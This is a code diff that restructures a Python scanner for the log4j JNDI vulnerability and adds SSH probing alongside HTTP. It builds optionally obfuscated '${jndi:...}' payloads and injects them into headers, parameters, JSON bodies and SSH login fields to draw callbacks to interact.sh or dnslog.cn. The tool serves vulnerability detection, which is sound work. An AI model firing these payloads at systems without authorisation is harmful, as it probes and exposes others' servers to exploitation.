@@ -1,19 +1,22 @@
 import argparse
 import asyncio
-from time import sleep
 import base64
 import json
+import logging
 import random
 import string
 import uuid
 from enum import Enum
+from time import sleep
 from urllib.parse import urlparse
-import logging
-import httpx
 
+import httpx
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Hash import SHA256
 from Crypto.PublicKey import RSA
+from paramiko import SSHClient
+from paramiko.client import WarningPolicy
+from paramiko.ssh_exception import SSHException
 
 
 class Dnslog:
@@ -92,12 +95,6 @@ class Interactsh:
         return new_log_entry
 
 
-class InjectionPointType(Enum):
-    Header = "header"
-    GetParam = "get"
-    PostParam = "post"
-
-
 PROTOCOLS = [
     "dns", "ldap", "ldaps", "rmi",
 ]
@@ -138,161 +135,226 @@ LOG_LEVELS = {
     "error": logging.ERROR,
 }
 
-proxy = None
-obfuscate_payloads = False
-request_path = None
-debug = True
+
+class BaseScanner:
+    obfuscate_payloads = True
+    request_path = None
+
+    def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
+        self.obfuscate_payloads = obfuscate_payloads
+        self.request_path = request_path
+
+    def _obfuscate_string(self, to_obfuscate: str) -> str:
+        out = []
+        for char in to_obfuscate:
+            obfuscation: str = random.choice(OBFUSCATIONS)
+            if "${" in obfuscation and "${::" not in obfuscation:
+                obfuscation = obfuscation.replace("[CHAR]", random.choice(OBFUSCATIONS))
+            out.append(obfuscation.replace("[CHAR]", char))
+        return "".join(out)
+
+    def create_payload(self, callback_url: str, protocol: str, test_path: str, test_domain: str = None, include_domain: bool = True) -> str:
+        format_str = "${{{jndi}:{protocol}://{target_callback}/{path}}}"
+
+        if include_domain:
+            target = f"{test_domain}.{callback_url}"
+        else:
+            target = callback_url
+        return format_str.format(
+            jndi=(self._obfuscate_string("jndi") if self.obfuscate_payloads else "jndi"),
+            protocol=(self._obfuscate_string(protocol) if self.obfuscate_payloads else protocol),
+            target_callback=target,
+            path=test_path
+        )
+
+    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
+        raise NotImplementedError("Use a subclass to run tests.")
 
 
-def obfuscate_string(to_obfuscate: str) -> str:
-    out = []
-    for char in to_obfuscate:
-        obfuscation: str = random.choice(OBFUSCATIONS)
-        if "${" in obfuscation and "${::" not in obfuscation:
-            obfuscation = obfuscation.replace("[CHAR]", random.choice(OBFUSCATIONS))
-        out.append(obfuscation.replace("[CHAR]", char))
-    return "".join(out)
+class HttpScanner(BaseScanner):
+    proxy = None
 
+    class InjectionPointType(Enum):
+        Header = "header"
+        GetParam = "get"
+        PostParam = "post"
 
-def create_payload(callback_url: str, protocol: str, test_path: str, test_domain: str = None, include_domain: bool = True, obfuscate: bool = True) -> str:
-    format_str = "${{{jndi}:{protocol}://{target_callback}/{path}}}"
+    def __init__(self, obfuscate_payloads: bool, request_path: str, proxy: str) -> None:
+        super().__init__(obfuscate_payloads, request_path)
+        self.proxy = proxy
 
-    if include_domain:
-        target = f"{test_domain}.{callback_url}"
-    else:
-        target = callback_url
-    return format_str.format(
-        jndi=(obfuscate_string("jndi") if obfuscate else "jndi"),
-        protocol=(obfuscate_string(protocol) if obfuscate else protocol),
-        target_callback=target,
-        path=test_path
-    )
-
-
-async def send_requests(client: httpx.AsyncClient, url: str, headers: dict, get_params: dict, post_params: dict) -> None:
-    opened_requests = []
-    try:
-        if get_params or headers != DEFAULT_HEADERS:
-            logging.debug("Sending GET")
-            opened_requests.append(
-                client.get(
-                    url,
-                    params=get_params,
-                    headers=headers,
-                    timeout=3,
-                )
-            )
-            if get_params:
-                query_string = '&'.join(
-                    [
-                        f"{key}={value}" for key, value in get_params.items()
-                    ]
-                )
+    async def send_requests(self, client: httpx.AsyncClient, url: str, headers: dict, get_params: dict, post_params: dict) -> None:
+        opened_requests = []
+        try:
+            if get_params or headers != DEFAULT_HEADERS:
+                logging.debug("Sending GET")
                 opened_requests.append(
                     client.get(
-                        f"{url}?{query_string}",
+                        url,
+                        params=get_params,
                         headers=headers,
                         timeout=3,
                     )
                 )
-        if post_params or headers != DEFAULT_HEADERS:
-            logging.debug("Sending POST as Form")
-            opened_requests.append(
-                client.post(
-                    url,
-                    params=get_params,
-                    headers=headers,
-                    data=post_params,
-                    timeout=3,
+                if get_params:
+                    query_string = '&'.join(
+                        [
+                            f"{key}={value}" for key, value in get_params.items()
+                        ]
+                    )
+                    opened_requests.append(
+                        client.get(
+                            f"{url}?{query_string}",
+                            headers=headers,
+                            timeout=3,
+                        )
+                    )
+            if post_params or headers != DEFAULT_HEADERS:
+                logging.debug("Sending POST as Form")
+                opened_requests.append(
+                    client.post(
+                        url,
+                        params=get_params,
+                        headers=headers,
+                        data=post_params,
+                        timeout=3,
+                    )
                 )
-            )
-            logging.debug("Sending POST as JSON")
-            opened_requests.append(
-                client.post(
-                    url,
-                    params=get_params,
-                    headers=headers,
-                    json=post_params,
-                    timeout=3,
-                ),
-            )
-    except Exception as excep:
-        logging.exception(excep)
-    for request in opened_requests:
-        try:
-            resp: httpx.Response = await request
-            logging.debug(f"{resp.status_code}: {resp.reason_phrase}")
-        except httpx.ConnectTimeout:
-            pass
+                logging.debug("Sending POST as JSON")
+                opened_requests.append(
+                    client.post(
+                        url,
+                        params=get_params,
+                        headers=headers,
+                        json=post_params,
+                        timeout=3,
+                    ),
+                )
         except Exception as excep:
             logging.exception(excep)
+        for request in opened_requests:
+            try:
+                resp: httpx.Response = await request
+                logging.debug(f"{resp.status_code}: {resp.reason_phrase}")
+            except httpx.ConnectTimeout:
+                pass
+            except Exception as excep:
+                logging.exception(excep)
 
+    async def test_injection_point(self, injection_type: InjectionPointType, callback_host: str, url: str, is_domain_in_callback: bool = True, choose_random_path: bool = True, test_path: str = None):
+        logging.info(f"Testing injection in {injection_type.value} with {callback_host} for {url}")
+        if choose_random_path:
+            target_path = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
+        else:
+            target_path = test_path
 
-async def test_injection_point(injection_type: InjectionPointType, callback_host: str, url: str, is_domain_in_callback: bool = True, choose_random_path: bool = True, test_path: str = None):
-    logging.info(f"Testing injection in {injection_type.value} with {callback_host} for {url}")
-    if choose_random_path:
-        target_path = ''.join(random.choice(string.ascii_lowercase) for _ in range(6))
-    else:
-        target_path = test_path
+        for protocol in PROTOCOLS:
+            logging.info(f"Testing the {protocol} protocol handler.")
+            payload = self.create_payload(
+                callback_host, protocol,
+                target_path, urlparse(url).netloc,
+                is_domain_in_callback
+            )
+            logging.debug(f"Using payload: {payload}")
+            if injection_type == self.InjectionPointType.GetParam:
+                params = {
+                    "q": payload,
+                    "t": payload.replace("{", r"%7B").replace("}", r"%7D")
+                }
+            else:
+                params = None
+            if injection_type == self.InjectionPointType.PostParam:
+                data = POST_BODY.copy()
+                for key in data.keys():
+                    data[key] = data[key].replace("[PAYLOAD]", payload)
+            else:
+                data = None
+            if injection_type == self.InjectionPointType.Header:
+                headers_to_inject = [
+                    {header_name: f'"{payload}"' if "Cookie" != header_name else f'session="{payload}"'} for header_name in HEADERS
+                ]
+            else:
+                headers_to_inject = [DEFAULT_HEADERS.copy()]
 
-    for protocol in PROTOCOLS:
-        logging.info(f"Testing the {protocol} protocol handler.")
-        payload = create_payload(
-            callback_host, protocol,
-            target_path, urlparse(url).netloc,
-            is_domain_in_callback, obfuscate_payloads
+            for header in headers_to_inject:
+                headers = DEFAULT_HEADERS.copy()
+                headers.update(header)
+                # logging.debug(f"Sending request with headers: {headers}")
+                async with httpx.AsyncClient(
+                    verify=False,
+                    proxies=self.proxy,
+                    follow_redirects=True,
+                    max_redirects=3
+                ) as client:
+                    await self.send_requests(client, url, headers, params, data)
+
+    async def test_all_injection_points(self, url: str, callback: str, domain_in_callback: bool = True, has_random_request_path: bool = True):
+        for injection_type in self.InjectionPointType:
+            try:
+                await self.test_injection_point(injection_type, callback, url, domain_in_callback, has_random_request_path, self.request_path)
+            except Exception as excep:
+                logging.exception(str(excep))
+
+    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
+        asyncio.run(
+            self.test_all_injection_points(
+                target, callback_domain, not no_payload_domain, use_random_request_path
+            )
         )
-        logging.debug(f"Using payload: {payload}")
-        if injection_type == InjectionPointType.GetParam:
-            params = {
-                "q": payload,
-                "t": payload.replace("{", r"%7B").replace("}", r"%7D")
-            }
-        else:
-            params = None
-        if injection_type == InjectionPointType.PostParam:
-            data = POST_BODY.copy()
-            for key in data.keys():
-                data[key] = data[key].replace("[PAYLOAD]", payload)
-        else:
-            data = None
-        if injection_type == InjectionPointType.Header:
-            headers_to_inject = [
-                {header_name: f'"{payload}"' if "Cookie" != header_name else f'session="{payload}"'} for header_name in HEADERS
-            ]
-        else:
-            headers_to_inject = [DEFAULT_HEADERS.copy()]
-
-        for header in headers_to_inject:
-            headers = DEFAULT_HEADERS.copy()
-            headers.update(header)
-            # logging.debug(f"Sending request with headers: {headers}")
-            async with httpx.AsyncClient(
-                verify=False,
-                proxies=proxy,
-                follow_redirects=True,
-                max_redirects=3
-            ) as client:
-                await send_requests(client, url, headers, params, data)
 
 
-async def test_all_injection_points(url: str, callback: str, domain_in_callback: bool = True, has_random_request_path: bool = True):
-    for injection_type in InjectionPointType:
-        try:
-            await test_injection_point(injection_type, callback, url, domain_in_callback, has_random_request_path, request_path)
-        except Exception as excep:
-            logging.exception(str(excep))
+class SshScanner(BaseScanner):
+
+    def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
+        super().__init__(obfuscate_payloads, request_path)
+        self._client = SSHClient()
+        self._client.set_missing_host_key_policy(WarningPolicy)
+
+    def run_tests(self, target: str, callback_domain: str, no_payload_domain: bool, use_random_request_path: bool):
+        if ":" in target:
+            hostname, port = target.split(':')
+        else:
+            hostname = target
+            port = 22
+        logging.debug(f"Checking {hostname} on port {port} over SSH.")
+        for protocol in PROTOCOLS:
+            payload = self.create_payload(
+                callback_domain, protocol,
+                self.request_path, target,
+                not no_payload_domain
+            )
+            try:
+                self._client.connect(hostname=hostname, port=port, username=payload, password=payload, timeout=3, look_for_keys=False, auth_timeout=2)
+                self._client.close()
+            except SSHException as e:
+                logging.exception(e)
+                pass
+
+
+class ImapScanner(BaseScanner):
+
+    def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
+        super().__init__(obfuscate_payloads, request_path)
+
+
+class SmtpScanner(BaseScanner):
+
+    def __init__(self, obfuscate_payloads: bool, request_path: str) -> None:
+        super().__init__(obfuscate_payloads, request_path)
 
 
 def parse_arguments() -> argparse.Namespace:
     parser = argparse.ArgumentParser("A scanner to check for the log4j vulnerability")
 
-    parser.add_argument('-u', '--url', help="The target to check", type=str, required=True)
-    parser.add_argument('-p', '--proxy', help="A proxy URL", type=str, default=None)
+    parser.add_argument('-p', '--protocol', help="which protocol to test", choices=["http", "ssh"], default="http", type=str)
+    parser.add_argument('-t', '--target', help="The target to check", type=str, required=True)
     parser.add_argument('-o', '--obfuscate', help="Whether payloads should be obfuscated or not", default=False, action="store_true")
     parser.add_argument('--no-payload-domain', help="Whether the original domain should be removed from the payload", default=False, action="store_true")
     parser.add_argument('--request-path', help="A custom path to add to the requests", type=str, default=None, action="store")
     parser.add_argument('-l', '--log-level', help="How detailed logging should be.", choices=LOG_LEVELS.keys(), default="error")
+
+    http_opts = parser.add_argument_group()
+    http_opts.add_argument('--proxy', help="A proxy URL", type=str, default=None)
 
     callback_group = parser.add_mutually_exclusive_group()
     callback_group.add_argument('--dns-callback', help="Which built-in DNS callback to use", type=str, choices=["interact.sh", "dnslog.cn"], default="interact.sh")
@@ -303,25 +365,18 @@ def parse_arguments() -> argparse.Namespace:
 
 def main():
     arguments = parse_arguments()
-
     logging.basicConfig(
         level=LOG_LEVELS[arguments.log_level],
         format='[%(asctime)s] {%(filename)s:%(lineno)d} - %(levelname)s - %(message)s'
     )
-
+    logging.debug(f"Got arguments {arguments}.")
     if arguments.proxy:
         global proxy
         proxy = arguments.proxy
 
     use_random_request_path = True
     if arguments.request_path:
-        global request_path
-        request_path = arguments.request_path
         use_random_request_path = False
-
-    if arguments.obfuscate:
-        global obfuscate_payloads
-        obfuscate_payloads = True
 
     dns_callback = None
     if arguments.custom_callback:
@@ -333,10 +388,13 @@ def main():
             dns_callback = Dnslog()
         callback_domain = dns_callback.domain
 
-    asyncio.run(
-        test_all_injection_points(
-            arguments.url, callback_domain, not arguments.no_payload_domain, use_random_request_path
-        )
+    if arguments.protocol == "http":
+        scanner = HttpScanner(arguments.obfuscate, arguments.request_path, arguments.proxy)
+    elif arguments.protocol == "ssh":
+        scanner = SshScanner(arguments.obfuscate, arguments.request_path)
+
+    scanner.run_tests(
+        arguments.target, callback_domain, not arguments.no_payload_domain, use_random_request_path
     )
 
     if not dns_callback:
